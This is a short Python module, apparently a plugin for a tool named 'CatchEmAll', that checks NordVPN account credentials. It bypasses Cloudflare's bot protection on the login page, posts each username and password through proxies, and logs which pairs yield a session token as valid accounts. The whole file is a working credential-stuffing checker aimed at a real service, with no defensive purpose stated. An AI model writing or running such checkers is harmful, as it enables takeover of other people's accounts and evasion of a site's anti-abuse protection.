from CatchEmAll.Requests.proxy_requests import ProxyRequest


def nordvpn(usr: str, pwd: str, mr: ProxyRequest):
    """
    Custom functions must have 3 params: username and password to check, and a ProxyRequest object
    The MR object has all the primitives that you need.
    Remember to update the database via mr.db
    """
    # TODO fix
    site_post = "https://ucp.nordvpn.com/api/v1/users/login"
    site_get = "https://ucp.nordvpn.com/login"
    # Retrieve CF valid cookie

    cookies = mr.bypass_cf(site_get)
    # change proxy account
    res = mr.post_with_checks(site_post,
                              data={"username": usr, "password": pwd}, cookies=cookies)
    res = dict(res.cookies).get("token", None)

    # check if inside the cookie the token is set, if positive the account is valid
    mr.clear_cookies()
    if res:
        mr.db.update_result(usr, pwd, "nordvpnProxy", True)
        return True
    else:
        mr.db.update_result(usr, pwd, "nordvpnProxy", False)
        return False
